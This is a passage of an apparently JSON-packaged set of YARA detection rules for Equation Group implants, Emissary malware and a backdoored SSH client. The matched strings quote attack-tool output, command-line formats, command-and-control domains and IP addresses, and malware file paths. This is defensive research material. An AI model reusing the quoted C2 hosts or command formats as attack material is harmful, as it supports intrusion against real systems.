fullword ascii\n        $s1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s \" fullword ascii\n        $s2 = \"Error while attemping to persist modules:\" fullword ascii\n        $s3 = \"Error while reading interface info from PIX\" fullword ascii\n        $s4 = \"LP.c:pixFree - Failed to get response\" fullword ascii\n        $s5 = \"WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default\" fullword ascii\n        $s6 = \"Unable to fetch config address for this OS version\" fullword ascii\n        $s7 = \"LP.c: interface information not available for this session\" fullword ascii\n        $s8 = \"[%s:%s:%d] ERROR: \" fullword ascii\n        $s9 = \"extract_fgbg\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 3000KB and 1 of ($x*) ) or ( 5 of them )\n}",
  "EQGRP_Implants_Gen1": "rule EQGRP_Implants_Gen1 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, lpexe, writeJetPlow-2130\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n        hash2 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n        hash3 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n        hash4 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n        hash5 = \"8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2\"\n        hash6 = \"6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3\"\n        hash7 = \"d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f\"\n        hash8 = \"ee3e3487a9582181892e27b4078c5a3cb47bb31fc607634468cc67753f7e61d7\"\n        hash9 = \"464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c\"\n   \n    strings:\n        $s1 = \"WARNING:  Session may not have been closed!\" fullword ascii\n        $s2 = \"EXEC Packet Processed\" fullword ascii\n        $s3 = \"Failed to insert the command into command list.\" fullword ascii\n        $s4 = \"Send_Packet: Trying to send too much data.\" fullword ascii\n        $s5 = \"payloadLength >= MAX_ALLOW_SIZE.\" fullword ascii\n        $s6 = \"Wrong Payload Size\" fullword ascii\n        $s7 = \"Unknown packet received......\" fullword ascii\n        $s8 = \"Returned eax = %08x\" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x457f and filesize < 6000KB and ( 2 of ($s*) ) ) or ( 5 of them )\n}",
  "EQGRP_eligiblebombshell_generic": "rule EQGRP_eligiblebombshell_generic \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"dd0e3ae6e1039a755bf6cb28bf726b4d6ab4a1da2392ba66d114a43a55491eb1\"\n        hash2 = \"dd0e3ae6e1039a755bf6cb28bf726b4d6ab4a1da2392ba66d114a43a55491eb1\"\n  \n    strings:\n        $s1 = \"logging.error(\\\"       Perhaps you should run with --scan?\\\")\" fullword ascii\n        $s2 = \"logging.error(\\\"ERROR: No entry for ETag [%s] in %s.\\\" %\" fullword ascii\n        $s3 = \"\\\"be supplied\\\")\" fullword ascii\n  \n    condition:\n        ( filesize < 70KB and 2 of ($s*) ) or ( all of them )\n}",
  "EQGRP_ssh_telnet_29": "rule EQGRP_ssh_telnet_29 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files ssh.py, telnet.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"630d464b1d08c4dfd0bd50552bee2d6a591fb0b5597ecebaa556a3c3d4e0aa4e\"\n        hash2 = \"07f4c60505f4d5fb5c4a76a8c899d9b63291444a3980d94c06e1d5889ae85482\"\n    \n    strings:\n        $s1 = \"received prompt, we're in\" fullword ascii\n        $s2 = \"failed to login, bad creds, abort\" fullword ascii\n        $s3 = \"sending command \\\" + str(n) + \\\"/\\\" + str(tot) + \\\", len \\\" + str(len(chunk) + \" fullword ascii\n        $s4 = \"received nat - EPBA: ok, payload: mangled, did not run\" fullword ascii\n        $s5 = \"no status returned from target, could be an exploit failure, or this is a version where we don't expect a stus return\" ascii\n        $s6 = \"received arp - EPBA: ok, payload: fail\" fullword ascii\n        $s7 = \"chopped = string.rstrip(payload, \\\"\\\\x0a\\\")\" fullword ascii\n   \n    condition:\n        ( filesize < 10KB and 2 of them ) or ( 3 of them )\n}",
  "EQGRP_tinyexec": "rule EQGRP_tinyexec \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files tinyexec\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n\n    strings:\n        $s1 = { 73 68 73 74 72 74 61 62 00 2E 74 65 78 74 }\n        $s2 = { 5A 58 55 52 89 E2 55 50 89 E1 }\n\n    condition:\n        uint32(0) == 0x464c457f and filesize < 270 and all of them\n}",
  "EQGRP_callbacks": "rule EQGRP_callbacks \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - Callback addresses\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n\n    strings:\n        $s1 = \"30.40.50.60:9342\" fullword ascii wide /* DoD */\n    \n    condition:\n        1 of them\n}",
  "EQGRP_Extrabacon_Output": "rule EQGRP_Extrabacon_Output \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - Extrabacon exploit output\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n\n    strings:\n        $s1 = \"|###[ SNMPresponse ]###\" fullword ascii\n        $s2 = \"[+] generating exploit for exec mode pass-disable\" fullword ascii\n        $s3 = \"[+] building payload for mode pass-disable\" fullword ascii\n        $s4 = \"[+] Executing:  extrabacon\" fullword ascii\n        $s5 = \"appended AAAADMINAUTH_ENABLE payload\" fullword ascii\n   \n    condition:\n        2 of them\n}",
  "EQGRP_Unique_Strings": "rule EQGRP_Unique_Strings \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - Unique strings\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n\n    strings:\n        $s1 = \"/BananaGlee/ELIGIBLEBOMB\" ascii\n        $s2 = \"Protocol must be either http or https (Ex: https://1.2.3.4:1234)\"\n\n    condition:\n        1 of them\n}",
  "EQGRP_RC5_RC6_Opcode": "rule EQGRP_RC5_RC6_Opcode\n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - RC5 / RC6 opcode\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/incidents/75812/the-equation-giveaway/\"\n        date = \"2016-08-17\"\n\n    strings:\n        /*\n            mov     esi, [ecx+edx*4-4]\n            sub     esi, 61C88647h\n            mov     [ecx+edx*4], esi\n            inc     edx\n            cmp     edx, 2Bh\n        */\n        $s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B }\n    \n    condition:\n        1 of them\n}",
  "Emissary_APT_Malware_1": "rule Emissary_APT_Malware_1 \n{\n\n    meta:\n        description = \"Detect Emissary Malware - from samples A08E81B411.DAT, ishelp.dll\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/V0epcf\"\n        date = \"2016-01-02\"\n        score = 75\n        hash1 = \"9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab\"\n        hash2 = \"70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629\"\n        hash3 = \"0e64e68f6f88b25530699a1cd12f6f2790ea98e6e8fa3b4bc279f8e5c09d7290\"\n        hash4 = \"69caa2a4070559d4cafdf79020c4356c721088eb22398a8740dea8d21ae6e664\"\n        hash5 = \"675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc\"\n        hash6 = \"e817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b\"\n        hash7 = \"a8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8\"\n        hash8 = \"acf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9\"\n        hash9 = \"e21b47dfa9e250f49a3ab327b7444902e545bed3c4dcfa5e2e990af20593af6d\"\n        hash10 = \"e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\"\n        hash11 = \"29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\"\n        hash12 = \"98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0\"\n        hash13 = \"fbcb401cf06326ab4bb53fb9f01f1ca647f16f926811ea66984f1a1b8cf2f7bb\"\n\n    strings:\n        $s1 = \"cmd.exe /c %s > %s\" fullword ascii\n        $s2 = \"execute cmd timeout.\" fullword ascii\n        $s3 = \"rundll32.exe \\\"%s\\\",Setting\" fullword ascii\n        $s4 = \"DownloadFile - exception:%s.\" fullword ascii\n        $s5 = \"CDllApp::InitInstance() - Evnet create successful.\" fullword ascii\n        $s6 = \"UploadFile - EncryptBuffer Error\" fullword ascii\n        $s7 = \"WinDLL.dll\" fullword wide\n        $s8 = \"DownloadFile - exception:%s,code:0x%08x.\" fullword ascii\n        $s9 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\" fullword ascii\n        $s10 = \"CDllApp::InitInstance() - Evnet already exists.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and 3 of them\n}",
  "Backdoored_ssh": "rule Backdoored_ssh {\nmeta:\nauthor = \"Kaspersky\"\nreference = \"https://securelist.com/energetic-bear-crouching-yeti/85345/\"\nactor = \"Energetic Bear/Crouching Yeti\"\nstrings:\n$a1 = \"OpenSSH\"\n$a2 = \"usage: ssh\"\n$a3 = \"HISTFILE\"\ncondition:\nuint32(0) == 0x464c457f and filesize<1000000 and all of ($a*)\n}",
  "apt_equation_exploitlib_mutexes": "rule apt_equation_exploitlib_mutexes\n{\n\n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect Equation group's Exploitation library http://goo.gl/ivt8EW\"\n        version = \"1.0\"\n        last_modified = \"2015-02-16\"\n        reference = \"http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/\"\n\n    strings:\n        $mz=\"MZ\"\n        $a1=\"prkMtx\" wide\n        $a2=\"cnFormSyncExFBC\" wide\n        $a3=\"cnFormVoidFBC\" wide\n        $a4=\"cnFormSyncExFBC\"\n        $a5=\"cnFormVoidFBC\"\n\n    condition:\n        (($mz at 0) and any of ($a*))\n}",
  "apt_equation_doublefantasy_genericresource": "rule apt_equation_doublefantasy_genericresource\n{\n\n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect DoubleFantasy encoded config http://goo.gl/ivt8EW\"\n        version = \"1.0\"\n        last_modified = \"2015-02-16\"\n        reference = \"http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/\"\n\n    strings:\n        $mz=\"MZ\"\n        $a1={06 00 42 00 49 00 4E 00 52 00 45 00 53 00}\n        $a2=\"yyyyyyyyyyyyyyyy\"\n        $a3=\"002\"\n\n    condition:\n        (($mz at 0) and all of ($a*)) and filesize < 500000\n}",
  "apt_equation_equationlaser_runtimeclasses": "rule apt_equation_equationlaser_runtimeclasses\n{\n\n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect the EquationLaser malware\"\n        version = \"1.0\"\n        last_modified = \"2015-02-16\"\n        reference = \"https://securelist.com/blog/\"\n\n    strings:\n        $a1=\"?a73957838_2@@YAXXZ\"\n        $a2=\"?a84884@@YAXXZ\"\n        $a3=\"?b823838_9839@@YAXXZ\"\n        $a4=\"?e747383_94@@YAXXZ\"\n        $a5=\"?e83834@@YAXXZ\"\n        $a6=\"?e929348_827@@YAXXZ\"\n\n    condition:\n        any of them\n}",
  "apt_equation_cryptotable": "rule apt_equation_cryptotable\n{\n\n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect the crypto library used in Equation group malware\"\n        version = \"1.0\"\n        last_modified = \"2015-02-16\"\n        reference = \"https://securelist.com/blog/\"\n\n    strings:\n        $a={37 DF E8 B6 C7 9C 0B AE 91 EF F0 3B 90 C6 80 85 5D 19 4B 45 44 12 3C E2 0D 5C 1C 7B C4 FF D6 05 17 14 4F 03 74 1E 41 DA 8F 7D DE 7E 99 F1 35 AC B8 46 93 CE 23 82 07 EB 2B D4 72 71 40 F3 B0 F7 78 D7 4C D1 55 1A 39 83 18 FA E1 9A 56 B1 96 AB A6 30 C5 5F BE 0C 50 C1}\n\n    condition:\n        $a\n}",
  "Equation_Kaspersky_TripleFantasy_1": "rule Equation_Kaspersky_TripleFantasy_1\n{\n\n    meta:\n        description = \"Equation Group Malware - TripleFantasy http://goo.gl/ivt8EW\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"b2b2cd9ca6f5864ef2ac6382b7b6374a9fb2cbe9\"\n\n    strings:\n        $mz = { 4d 5a }\n        $s0 = \"%SystemRoot%\\\\system32\\\\hnetcfg.dll\" fullword wide\n        $s1 = \"%WINDIR%\\\\System32\\\\ahlhcib.dll\" fullword wide\n        $s2 = \"%WINDIR%\\\\sjyntmv.dat\" fullword wide\n        $s3 = \"Global\\\\{8c38e4f3-591f-91cf-06a6-67b84d8a0102}\" fullword wide\n        $s4 = \"%WINDIR%\\\\System32\\\\owrwbsdi\" fullword wide\n        $s5 = \"Chrome\" fullword wide\n        $s6 = \"StringIndex\" fullword ascii\n        $x1 = \"itemagic.net@443\" fullword wide\n        $x2 = \"team4heat.net@443\" fullword wide\n        $x5 = \"62.216.152.69@443\" fullword wide\n        $x6 = \"84.233.205.37@443\" fullword wide\n        $z1 = \"www.microsoft.com@80\" fullword wide\n        $z2 = \"www.google.com@80\" fullword wide\n        $z3 = \"127.0.0.1:3128\" fullword wide\n\n    condition:\n        ( $mz at 0 ) and filesize < 300000 and (( all of ($s*) and all of ($z*) ) or ( all of ($s*) and 1 of ($x*) ))\n}",
  "Equation_Kaspersky_DoubleFantasy_1": "rule Equation_Kaspersky_DoubleFantasy_1\n{\n\n    meta:\n        description = \"Equation Group Malware - DoubleFantasy\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"d09b4b6d3244ac382049736ca98d7de0c6787fa2\"\n\n    strings:\n        $mz = { 4d 5a }\n        $z1 = \"msvcp5%d.dll\" fullword ascii\n        $s0 = \"actxprxy.GetProxyDllInfo\" fullword ascii\n        $s3 = \"actxprxy.DllGetClassObject\" fullword ascii\n        $s5 = \"actxprxy.DllRegisterServer\" fullword ascii\n        $s6 = \"actxprxy.DllUnregisterServer\" fullword ascii\n        $x1 = \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" ascii\n        $x2 = \"191H1a1\" fullword ascii\n        $x3 = \"November \" fullword ascii\n        $x4 = \"abababababab\" fullword ascii\n        $x5 = \"January \" fullword ascii\n        $x6 = \"October \" fullword ascii\n        $x7 = \"September \" fullword ascii\n\n    condition:\n        ( $mz at 0 ) and filesize < 350000 and (( $z1 ) or ( all of ($s*) and 6 of ($x*) ))\n}",
  "Equation_Kaspersky_GROK_Keylogger": "rule Equation_Kaspersky_GROK_Keylogger\n{\n\n    meta:\n        description = \"Equation Group Malware - GROK keylogger\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"50b8f125ed33233a545a1aac3c9d4bb6aa34b48f\"\n\n    strings:\n        $mz = { 4d 5a }\n        $s0 = \"c:\\\\users\\\\rmgree5\\\\\" ascii\n        $s1 = \"msrtdv.sys\" fullword wide\n        $x1 = \"svrg.pdb\" fullword ascii\n        $x2 = \"W32pServiceTable\" fullword ascii\n        $x3 = \"In forma\" fullword ascii\n        $x4 = \"ReleaseF\" fullword ascii\n        $x5 = \"criptor\" fullword ascii\n        $x6 = \"astMutex\" fullword ascii\n        $x7 = \"ARASATAU\" fullword ascii\n        $x8 = \"R0omp4ar\" fullword ascii\n        $z1 = \"H.text\" fullword ascii\n        $z2 = \"\\\\registry\\\\machine\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n        $z4 = \"\\\\registry\\\\machine\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Session Manager\\\\Environment\" wide fullword\n\n    condition:\n        ( $mz at 0 ) and filesize < 250000 and ($s0 or ( $s1 and 6 of ($x*) ) or ( 6 of ($x*) and all of ($z*) ))\n}",
  "Equation_Kaspersky_GreyFishInstaller": "rule Equation_Kaspersky_GreyFishInstaller\n{\n\n    meta:\n        description = \"Equation Group Malware - Grey Fish\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"58d15d1581f32f36542f3e9fb4b1fc84d2a6ba35\"\n\n    strings:\n        $s0 = \"DOGROUND.exe\" fullword wide\n        $s1 = \"Windows Configuration Services\" fullword wide\n        $s2 = \"GetMappedFilenameW\" fullword ascii\n\n    condition:\n        all of them\n}",
  "Equation_Kaspersky_EquationDrugInstaller": "rule Equation_Kaspersky_EquationDrugInstaller\n{\n\n    meta:\n        description = \"Equation Group Malware - EquationDrug installer LUTEUSOBSTOS\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"61fab1b8451275c7fd580895d9c68e152ff46417\"\n\n    strings:\n        $mz = { 4d 5a }\n\n        $s0 = \"\\\\system32\\\\win32k.sys\" fullword wide\n        $s1 = \"ALL_FIREWALLS\" fullword ascii\n        $x1 = \"@prkMtx\" fullword wide\n        $x2 = \"STATIC\" fullword wide\n        $x3 = \"windir\" fullword wide\n        $x4 = \"cnFormVoidFBC\" fullword wide\n        $x5 = \"CcnFormSyncExFBC\" fullword wide\n        $x6 = \"WinStaObj\" fullword wide\n        $x7 = \"BINRES\" fullword wide\n\n    condition:\n        ( $mz at 0 ) and filesize < 500000 and all of ($s*) and 5 of ($x*)\n}",
  "Equation_Kaspersky_EquationLaserInstaller": "rule Equation_Kaspersky_EquationLaserInstaller\n{\n\n    meta:\n        description = \"Equation Group Malware - EquationLaser Installer\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"5e1f56c1e57fbff96d4999db1fd6dd0f7d8221df\"\n\n    strings:\n        $mz = { 4d 5a }\n        $s0 = \"Failed to get Windows version\" fullword ascii\n        $s1 = \"lsasrv32.dll and lsass.exe\" fullword wide\n        $s2 = \"\\\\\\\\%s\\\\mailslot\\\\%s\" fullword ascii\n        $s3 = \"%d-%d-%d %d:%d:%d Z\" fullword ascii\n        $s4 = \"lsasrv32.dll\" fullword ascii\n        $s5 = \"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\" fullword ascii\n        $s6 = \"%s %02x %s\" fullword ascii\n        $s7 = \"VIEWERS\" fullword ascii\n        $s8 = \"5.2.3790.220 (srv03_gdr.040918-1552)\" fullword wide\n\n    condition:\n        ( $mz at 0 ) and filesize < 250000 and 6 of ($s*)\n}",
  "Equation_Kaspersky_FannyWorm": "rule Equation_Kaspersky_FannyWorm\n{\n\n    meta:\n        description = \"Equation Group Malware - Fanny Worm\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"1f0ae54ac3f10d533013f74f48849de4e65817a7\"\n\n    strings:\n        $mz = { 4d 5a }\n        $s1 = \"x:\\\\fanny.bmp\" fullword ascii\n        $s2 = \"32.exe\" fullword ascii\n        $s3 = \"d:\\\\fanny.bmp\" fullword ascii\n        $x1 = \"c:\\\\windows\\\\system32\\\\kernel32.dll\" fullword ascii\n        $x2 = \"System\\\\CurrentControlSet\\\\Services\\\\USBSTOR\\\\Enum\" fullword ascii\n        $x3 = \"System\\\\CurrentControlSet\\\\Services\\\\PartMgr\\\\Enum\" fullword ascii\n        $x4 = \"\\\\system32\\\\win32k.sys\" fullword wide\n        $x5 = \"\\\\AGENTCPD.DLL\" fullword ascii\n        $x6 = \"agentcpd.dll\" fullword ascii\n        $x7 = \"PADupdate.exe\" fullword ascii\n        $x8 = \"dll_installer.dll\" fullword ascii\n        $x9 = \"\\\\restore\\\\\" fullword ascii\n        $x10 = \"Q:\\\\__?__.lnk\" fullword ascii\n        $x11 = \"Software\\\\Microsoft\\\\MSNetMng\" fullword ascii\n        $x12 = \"\\\\shelldoc.dll\" fullword ascii\n        $x13 = \"file size = %d bytes\" fullword ascii\n        $x14 = \"\\\\MSAgent\" fullword ascii\n        $x15 = \"Global\\\\RPCMutex\" fullword ascii\n        $x16 = \"Global\\\\DirectMarketing\" fullword ascii\n\n    condition:\n        ( $mz at 0 ) and filesize < 300000 and (( 2 of ($s*) ) or ( 1 of ($s*) and 6 of ($x*) ) or ( 14 of ($x*)))\n}",
  "Equation_Kaspersky_HDD_reprogramming_module": "rule Equation_Kaspersky_HDD_reprogramming_module \n{\n\n    meta:\n        description = \"Equation Group Malware - HDD reprogramming module\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"ff2b50f371eb26f22eb8a2118e9ab0e015081500\"\n    \n    strings:\n        $mz = { 4d 5a }\n        $s0 = \"nls_933w.dll\" fullword ascii\n        $s1 = \"BINARY\" fullword wide\n        $s2 = \"KfAcquireSpinLock\" fullword ascii\n        $s3 = \"HAL.dll\" fullword ascii\n        $s4 = \"READ_REGISTER_UCHAR\" fullword ascii\n    condition:\n        ( $mz at 0 ) and filesize < 300000 and all of ($s*)\n}",
  "Equation_Kaspersky_EOP_Package": "rule Equation_Kaspersky_EOP_Package \n{\n\n    meta:\n        description = \"Equation Group Malware - EoP package and malware launcher\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"2bd1b1f5b4384ce802d5d32d8c8fd3d1dc04b962\"\n\n    strings:\n        $mz = { 4d 5a }\n        $s0 = \"abababababab\" fullword ascii\n        $s1 = \"abcdefghijklmnopq\" fullword ascii\n        $s2 = \"@STATIC\" fullword wide\n        $s3 = \"$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" fullword ascii\n        $s4 = \"@prkMtx\" fullword wide\n        $s5 = \"prkMtx\" fullword wide\n        $s6 = \"cnFormVoidFBC\" fullword wide\n\n    condition:\n        ( $mz at 0 ) and filesize < 100000 and all of ($s*)\n}",
  "Equation_Kaspersky_TripleFantasy_Loader": "rule Equation_Kaspersky_TripleFantasy_Loader \n{\n\n    meta:\n        description = \"Equation Group Malware - TripleFantasy Loader\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/16\"\n        hash = \"4ce6e77a11b443cc7cbe439b71bf39a39d3d7fa3\"\n    \n    strings:\n        $mz = { 4d 5a }\n        $x1 = \"Original Innovations, LLC\" fullword wide\n        $x2 = \"Moniter Resource Protocol\" fullword wide\n        $x3 = \"ahlhcib.dll\" fullword wide\n        $s0 = \"hnetcfg.HNetGetSharingServicesPage\" fullword ascii\n        $s1 = \"hnetcfg.IcfGetOperationalMode\" fullword ascii\n        $s2 = \"hnetcfg.IcfGetDynamicFwPorts\" fullword ascii\n        $s3 = \"hnetcfg.HNetFreeFirewallLoggingSettings\" fullword ascii\n        $s4 = \"hnetcfg.HNetGetShareAndBridgeSettings\" fullword ascii\n        $s5 = \"hnetcfg.HNetGetFirewallSettingsPage\" fullword ascii\n    \n    condition:\n        ( $mz at 0 ) and filesize < 50000 and ( all of ($x*) and all of ($s*) )\n}",
  "Equation_Kaspersky_SuspiciousString": "rule Equation_Kaspersky_SuspiciousString \n{\n  \n    meta:\n        description = \"Equation Group Malware - suspicious string found in sample\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/ivt8EW\"\n        date = \"2015/02/17\"\n        score = 60\n   \n    strings:\n        $mz = { 4d 5a }\n        $s1 = \"i386\\\\DesertWinterDriver.pdb\" fullword\n        $s2 = \"Performing UR-specific post-install...\"\n        $s3 = \"Timeout waiting for the \\\"canInstallNow\\\" event from the implant-specific EXE!\"\n        $s4 = \"STRAITSHOOTER30.exe\"\n        $s5 = \"standalonegrok_2.1.1.1\"\n        $s6 = \"c:\\\\users\\\\rmgree5\\\\\"\n    \n    condition:\n        ( $mz at 0 ) and filesize < 500000 and all of ($s*)\n}",
  "EquationDrug_NetworkSniffer1": "rule EquationDrug_NetworkSniffer1\n{\n\n    meta:\n        description = \"EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"26e787997a338d8111d96c9a4c103cf8ff0201ce\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s3 = \"sys\\\\mstcp32.dbg\" fullword ascii\n        $s7 = \"mstcp32.sys\" fullword wide\n        $s8 = \"p32.sys\" fullword ascii\n        $s9 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s10 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s11 = \"\\\\Device\\\\%ws\" fullword wide\n    \n    condition:\n        all of them\n}",
  "EquationDrug_CompatLayer_UnilayDLL": "rule EquationDrug_CompatLayer_UnilayDLL \n{\n\n    meta:\n        description = \"EquationDrug - Unilay.DLL\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"a3a31937956f161beba8acac35b96cb74241cd0f\"\n\n    strings:\n        $mz = { 4d 5a }\n        $s0 = \"unilay.dll\" fullword ascii\n\n    condition:\n        ( $mz at 0 ) and $s0\n}",
  "EquationDrug_HDDSSD_Op": "rule EquationDrug_HDDSSD_Op \n{\n\n    meta:\n        description = \"EquationDrug - HDD/SSD firmware operation - nls_933w.dll\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"ff2b50f371eb26f22eb8a2118e9ab0e015081500\"\n\n    strings:\n        $s0 = \"nls_933w.dll\" fullword ascii\n\n    condition:\n        all of them\n}",
  "EquationDrug_NetworkSniffer2": "rule EquationDrug_NetworkSniffer2 \n{\n\n    meta:\n        description = \"EquationDrug - Network Sniffer - tdip.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"7e3cd36875c0e5ccb076eb74855d627ae8d4627f\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"IP Transport Driver\" fullword wide\n        $s2 = \"tdip.sys\" fullword wide\n        $s3 = \"sys\\\\tdip.dbg\" fullword ascii\n        $s4 = \"dip.sys\" fullword ascii\n        $s5 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s6 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s7 = \"\\\\Device\\\\%ws\" fullword wide\n\n    condition:\n        all of them\n}",
  "EquationDrug_NetworkSniffer3": "rule EquationDrug_NetworkSniffer3 \n{\n\n    meta:\n        description = \"EquationDrug - Network Sniffer - tdip.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"14599516381a9646cd978cf962c4f92386371040\"\n\n    strings:\n        $s0 = \"Corporation. All rights reserved.\" fullword wide\n        $s1 = \"IP Transport Driver\" fullword wide\n        $s2 = \"tdip.sys\" fullword wide\n        $s3 = \"tdip.pdb\" fullword ascii\n\n    condition:\n        all of them\n}",
  "EquationDrug_VolRec_Driver": "rule EquationDrug_VolRec_Driver \n{\n\n    meta:\n        description = \"EquationDrug - Collector plugin for Volrec - msrstd.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"ee2b504ad502dc3fed62d6483d93d9b1221cdd6c\"\n\n    strings:\n        $s0 = \"msrstd.sys\" fullword wide\n        $s1 = \"msrstd.pdb\" fullword ascii\n        $s2 = \"msrstd driver\" fullword wide\n\n    condition:\n        all of them\n}",
